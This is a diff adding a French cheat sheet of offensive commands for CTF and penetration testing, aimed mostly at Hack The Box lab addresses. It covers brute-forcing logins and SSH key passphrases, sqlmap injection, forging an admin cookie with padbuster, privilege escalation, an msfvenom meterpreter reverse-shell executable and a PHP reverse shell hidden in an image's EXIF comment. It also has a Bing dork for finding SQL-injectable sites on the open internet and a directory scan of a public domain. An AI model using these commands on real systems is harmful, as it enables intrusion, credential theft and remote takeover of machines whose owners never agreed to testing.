@@ -1,0 +1,284 @@
+# Methodes :
+
+searchsploit -m URI // --outil de recherche de faille pour outils communs
+
+trouver des fails :
+uikto -h url
+nmap -p 445 --script vuln 10.10.10.4 -Pn
+
+BruteforceWEBAPP
+hydra
+
+Scanner les répertoires d'un site web :
+dirb http://10.10.10.176 /usr/share/dirb/wordlists/common.txt
+
+gobuster --url http://breizh-developpement.legtux.org/ dir --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+
+explorer les sous domaines : dig axfr @10.10.10.13 cronos.htb​​ after adding ​ cronos.htb​​ to the ​ /etc/hosts​​ file.
+
+
+++ Pour trouver les fichiers.
+
+gobuster --url http://docker.hackthebox.eu:30030/api/ dir --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -x php,txt,html,htm
+
+FUZZ test
+wfuzz -c -z file,'shell.txt' http://10.10.10.181/FUZZ
+wfuzz --hh=24 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://docker.hackthebox.eu:30030/api/action.php?FUZZ=test
+
+wfuzz --hh=24 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt "http://docker.hackthebox.eu:30030/api/action.php?reset=FUZZ"
+
+Liste des processus :
+htop
+
+Afficher les connexions existante avec l'ordi.
+netstat -tulp
+(port ouvert en local)
+
+Rajouter au fichier host :
+nano /etc/hosts
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+Reverse shell samples :
+
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+Scripts d’énumération automatique :
+
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh
+
+https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+
+Commandes d’interaction (pour CTF communs)
+
+who
+
+-> Affiche les tty connectés
+
+wall "hello world !"
+-> Envoie un message sur tous les tty connectés
+
+Transfert de fichiers
+
+socat TCP4-LISTEN:1234 TCP4:10.10.10.171:80 &
+-> Lance un relai TCP vers une autre machine (pivoting)
+
+Pratique lorsqu’on se connecte à HTB via un VPS
+
+python -m SimpleHTTPServer <PORT>
+-> Lance un serveur web dans le répertoire local
+
+apt-get install python-pyftpdlib
+python -m pyftpdlib -p 21
+->Lance un serveur ftp dans le répertoire courant
+
+impacket/examples/smbserver.py -smb2support -username guest -password guest share /root/htb
+-> Lance un serveur smb accessible en tant que guest/guest
+
+Possibilité d’y accéder sous Windows avec un net use
+
+Enumération :
+
+nslookup -type=<MX / A / AAA / TXT / CNAME / PTR> <DOMAIN>
+nslookup -type=MX test.fr
+
+nmap ( 
+ -A : détection du système et des versions
+ -sP : simple ping scan
+ -sS/sT/sA/sW/sM: Scans TCP SYN/Connect()/ACK/Window/Maimon
+ -sN/sF/sX: Scans TCP Null, FIN et Xmas
+ -sU: Scan UDP 
+ -T4 : Définit une temporisation[0-5]
+  )
+nmap -A -T4 -sV 10.10.10.157
+
+nmap --script <SCRIPT> -p <PORT> <IPADDRESS>
+nmap –script smb-vuln* -p 139,445 10.10.10.134
+
+nikto -h <URL> -p <PORTS>
+nikto -h 192.168.0.1 -p 80,443
+
+gobuster --url <IP ADDRESS> dir --wordlist <WORDLIST> -x <EXTENSION>
+gobuster –url 10.10.10.157 dir –wordlist /usr/share/wordlists/dirb/big.txt -x php,txt,html,htm
+
+-k -> pas de vérification du certificat SSL
+
+smbclient --list //<IPADDRESS>/ -U ""
+Enumération des répertoires partagés accessibles en anonymous
+
+rpcclient -U "" -N 10.10.10.180
+Accès en RPC de façon anonyme (WINDOWS)
+
+enum4linux -a 10.10.10.180
+Enumération SMB, RPC & co (WINDOWS)
+
+cat *.txt | gobuster --url 10.10.10.157 dir --wordlist -
+-> pour piper plusieurs wordlists dans gobuster
+
+dirb <url> <wordlist>
+dirb http://docker.hackthebox.eu:58651 /usr/share/dirb/wordlists/vulns/apache.txt
+
+dirb options :
+ -a "agent" -> spécifie un user-agent
+ -R -> récursivité interactive
+ -o output.txt -> redirige l'output
+wfuzz --hh=<PARAM_SIZE>  -w <WORDLIST> <URL>.php?<PARAM_NAME>=test
+wfuzz –hh=24 -w /usr/share/dirb/wordlists/big.txt http://docker.hackthebox.eu:42566/api/action.php?FUZZ=test
+
+Exploitation & Elévation de privilèges :
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+/usr/bin/script -qc /bin/bash /dev/null
+Pour obtenir un shell plus élevé, afin de passer d’un reverse shell à un shell complet
+
+padbuster <URL> <COOKIE> <BLOCK_SIZE> -cookies "<PHPESSID_COOKIE> <OPTIONNAL_COOKIES>" --plaintext '<NEW_VALUE>'
+padbuster http://docker.hackthebox.eu:59436/profile.php tu%2FOelHH0Nx8BaMhIurtihnbzj6YiABdvdMp0%2Fm6NII%2FClg%2B5Os9Rg%3D%3D 8 -cookies “PHPSESSID=74j9m7o8pbaq8pdoq3l56rvpk4; iknowmag1k=tu%2FOelHH0Nx8BaMhIurtihnbzj6YiABdvdMp0%2Fm6NII%2FClg%2B5Os9Rg%3D%3D” –plaintext ‘{“user”:”test”,”role”:”admin”}’
+
+searchsploit -t <INTITLE>  <KEYWORDS> -w
+searchsploit windows local smb
+
+sudo -l
+-> liste les commandes autorisées pour l’utilisateur courant
+
+find / -type d -writable 2> /dev/null
+-> Liste les répertoires accessibles en écriture
+
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null
+-> Liste les binaires exécutables par l’utilisateur courant
+
+find / -type f -perm /6000 -ls 2>/dev/null 
+-> Liste les fichiers setuid/setgid sur le système
+
+find / -iname "mon_fichier" -print 2>/dev/null
+-> Trouver un fichier précis sur le système
+
+binwalk socute.jpg 
+-> Vérifier le contenu d’une image (peut contenir des fichiers zip par exemple)
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<LOCALIP> lport=<LOCALPORT> -f <FORMAT> > <OUTPUTFILE>
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.100 lport=4444 -f exe > payload.exe
+
+ exiftool -Comment='<?php $sock = fsockopen("<IPADDRESS>",<PORT>);$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>'   <IMAGE>
+exiftool -Comment='<?php $sock = fsockopen(“10.10.10.1”,1234);$proc = proc_open(“/bin/sh -i”, array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>’ photo.png
+
+Injection SQL :
+
+sqlmap -u <URL> (--dbs / --tables -D <DATABASE> / --columns -D <DATABASE> -T <TABLENAME>)
+sqlmap -u http://bidule.fr/index.php?id= –columns -D information_schema -T USER_PRIVILEGES
+
+Bruteforce :
+
+crunch <MIN> <MAX> <CONTENT>
+crunch 4 15 “abcdefghijklmnopqrstuvwxyz”
+
+hydra -l <USER> -P <WORDLIST> <IP ADDRESS> <METHOD> <URL>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.157 http-get /monitoring
+
+hydra -l <LOGIN> -P <WORDLIST> <URL> <METHOD>"<PAGE>:<ARGUMENT>=^<VALUE>^:<INCORRECT STRING>" -w <THREADS> -s <PORT>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt docker.hackthebox.eu http-post-form “/index.php:password=^PASS^:Invalid password” -w 10 -s 45692
+
+john --incremental <HASHFILE>
+Pour bruteforcer de façon incrémentale
+
+john <HASHFILE> --wordlist=/usr/share/wordlists/rockyou.txt
+Pour bruteforcer avec un dictionnaire
+
+Script de bruteforce anti-CSRF :
+
+https://github.com/J3wker/anti-CSRF_Token-Bruteforce
+
+Mémo Assembleur
+
+Les Registres et leurs fonctions :
+
+
+Les Instructions :
+
+
+
+Commandes gdb :
+
+disass main -> désassemblage de la fonction main
+
+b *0x5655555d0 -> placer un breakpoint à l’adresse spécifiée
+
+x/x $eip -> Affiche la valeur d’un registre ($ = valeur)
+
+x/i $eip -> Affiche la prochaine instruction dans le registre eip
+
+x/wx $esp -> Affiche la valeur sur la stack
+
+r -> run
+
+c -> continue
+
+dumpargs -> dumper les arguments du programme
+
+Pour faire un buffer overflow, il suffit de récupérer l’adresse de la sauvegarde du registre eip et l’adresse de début du buffer, on peut soustraire les deux et trouver le nombre de caractères que prend en compte notre buffer
+
+Compiler sans protection :
+
+gcc -m32 -fno-stack-protector -z execstack bof.c -o bof
+
+-> Si la compil en 32bits ne fonctionne pas, installer libc en 32bits :
+
+apt-get install libc6-dev-i386
+
+Rapport de scan nmap :
+nmap -A ip
+nmap -sC -sV -sT -oN magic.txt Magic.htb
+nmap --script smb-vuln* -p 135,139,445 10.10.10.169 //Vulnérabilité SMB
+
+Enum4Linux:
+enum4linux 10.10.10.172
+
+Obtenir le passphrase :
+/usr/share/john/ssh2john.py id_rsa > id_rsa.hash
+chmod 700 id_rsa id_rsa.hash
+john -w=/usr/share/wordlists/rockyou.txt id_rsa.hash
+
+Voir la liste des droits sudo de l'utilisateur actuel :
+sudo -l
+sudo -u root nano /chemin/
+Executer une commande depuis un fichier CTRL+R and CTRL+X
+
+
+
+Parcourir un fichier sans cd :
+ls local/config (etc cat ..)
+
+Afficher les fichiers cachés sur linux :
+ls -lAR​ ​ /home/george
+
+connect to sysadmin :
+echo 'os.execute("bin/bash -i")' > hack.lua
+sudo -u sysadmin /home/sysadmin/luvit hack.lua
+
+Afficher du contenue de fichier lors de la connection :
+cd /etc/update-motd.d/ #Mise à jour tout les 30 secondes
+echo "cat /root/root.txt" >> 00-header
+
+Voir l'historique:
+cat .bash_history
+history
+
+Memo :
+Penser à chercher les infos dans les sources webs. id et mdp.
+
+ImageHidding afficher les trucs cachés :
+steghide extract -sf HackerAccessGranted.jpg
+
+Ecouter sur un port :
+nc -lvp port //Listenning on any adress
+
+
+LinEnum.sh
+Service HTPPServer Python : python -m SimpleHTTPServer <PORT>
+Trouver des sitesvulnérables via injection SQL :
+sqliv -d inurl:item.php?id= -e bing -p 100
+
+Pour Privilege esclation sur une session meterpreter:
+background
+Lister les sessions : sessions -l
+Changer de session : session -i 1
+Reconnaissance : use post/multi/recon/local_exploit_suggester
